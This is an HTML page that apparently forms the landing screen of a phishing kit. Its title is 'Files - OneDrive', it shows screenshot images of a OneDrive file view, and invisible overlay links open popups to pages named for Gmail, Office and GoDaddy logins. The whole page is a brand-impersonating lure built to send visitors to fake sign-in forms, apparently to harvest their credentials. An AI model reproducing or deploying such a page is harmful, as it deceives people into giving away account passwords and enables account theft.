<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Files - OneDrive</title>
<link rel="shortcut icon" href="images/fav_onedrv.ico" />
<style type="text/css">
body
{
   background-color: #FFFFFF;
   background-image: url(images/bg.png);
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #E3E842;
}
</style>
<script type="text/javascript">
<!--
function popupwnd(url, toolbar, menubar, locationbar, resize, scrollbars, statusbar, left, top, width, height)
{
   if (left == -1)
   {
      left = (screen.width/2)-(width/2);
   }
   if (top == -1)
   {
      top = (screen.height/2)-(height/2);
   }
   var popupwindow = this.open(url, '', 'toolbar=' + toolbar + ',menubar=' + menubar + ',location=' + locationbar + ',scrollbars=' + scrollbars + ',resizable=' + resize + ',status=' + statusbar + ',left=' + left + ',top=' + top + ',width=' + width + ',height=' + height);
}
//-->
</script>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:1366px;height:124px;text-align:left;z-index:0;">
<img src="images/ori2.png" id="Image1" alt="" align="top" border="0" style="width:1366px;height:124px;"></div>
<div id="bv_Image2" style="margin:0;padding:0;position:absolute;left:9px;top:152px;width:1340px;height:421px;text-align:left;z-index:1;">
<img src="images/bode_all.png" id="Image2" alt="" align="top" border="0" style="width:1340px;height:421px;"></div>
<div id="bv_Text1" style="margin:0;padding:0;position:absolute;left:242px;top:653px;width:150px;height:16px;text-align:left;z-index:2;">
<font style="font-size:13px" color="#000000" face="Arial">_</font></div>
<div id="bv_Image3" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:310px;height:50px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:3;">
<a href="index.php"><img src="images/klik.png" id="Image3" alt="" align="top" border="0" style="width:310px;height:50px;"></a></div>
<div id="bv_Image5" style="margin:0;padding:0;position:absolute;left:1166px;top:7px;width:194px;height:110px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:5;">
<a href="index.php"><img src="images/klik.png" id="Image5" alt="" align="top" border="0" style="width:194px;height:110px;"></a></div>
<div id="bv_Image6" style="margin:0;padding:0;position:absolute;left:84px;top:372px;width:353px;height:92px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:6;">
<a href="javascript:popupwnd('index_forgmal.php','no','no','no','yes','yes','no','100','100','1200','900')" target="_self"><img src="images/klik.png" id="Image6" alt="" align="top" border="0" style="width:353px;height:92px;"></a></div>
<div id="bv_Image7" style="margin:0;padding:0;position:absolute;left:506px;top:380px;width:353px;height:92px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:7;">
<a href="javascript:popupwnd('index_foroffice.php','no','no','no','yes','yes','no','100','100','1280','900')" target="_self"><img src="images/klik.png" id="Image7" alt="" align="top" border="0" style="width:353px;height:92px;"></a></div>
<div id="bv_Image8" style="margin:0;padding:0;position:absolute;left:932px;top:363px;width:353px;height:133px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:8;">
<a href="javascript:popupwnd('index_forgodad.php','no','no','no','yes','yes','no','100','100','1200','900')" target="_self"><img src="images/klik.png" id="Image8" alt="" align="top" border="0" style="width:353px;height:133px;"></a></div>
<div id="bv_Image9" style="margin:0;padding:0;position:absolute;left:1293px;top:170px;width:35px;height:22px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:9;">
<a href="index.php"><img src="images/klik.png" id="Image9" alt="" align="top" border="0" style="width:35px;height:22px;"></a></div>
<input type="text" id="Editbox1" style="position:absolute;left:41px;top:61px;width:166px;height:20px;border:0px #C0C0C0 dotted;background-color:transparent;font-family:'Courier New';font-size:16px;z-index:10" name="Editbox1" value="">
</body>
</html>